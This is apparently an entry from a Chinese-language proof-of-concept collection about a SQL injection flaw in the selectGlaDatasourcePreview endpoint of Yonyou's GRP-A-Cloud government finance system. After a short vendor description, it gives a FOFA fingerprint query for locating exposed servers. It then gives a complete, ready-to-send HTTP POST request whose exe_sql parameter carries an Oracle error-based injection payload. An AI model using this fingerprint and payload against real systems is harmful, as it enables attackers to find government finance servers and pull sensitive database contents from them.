# 用友GRP-A-Cloud政府财务云系统接口selectGlaDatasourcePreview存在SQL注入漏洞

用友政务软件有限公司由用友（集团）和中国财政科学研究院共同设立，是面向政府部门、事业单位、非营利组织的全方位业务管理信息化解决方案提供商，是中国电子政务百强企业、中国领先的公共财政管理软件提供商、中国领先的行政事业单位计划财务管理软件提供商。公司的业务涵盖财政、银行、税务、社保、民生、公安、交通、海关、国土资源等行业。用友GRP A++Cloud政府财务云exe_sql存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## fofa

```yaml
body="/pf/portal/login/css/fonts/style.css"
```


## poc

```yaml
POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
Host: {hostname}
Content-Length: 279
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407171258885.png)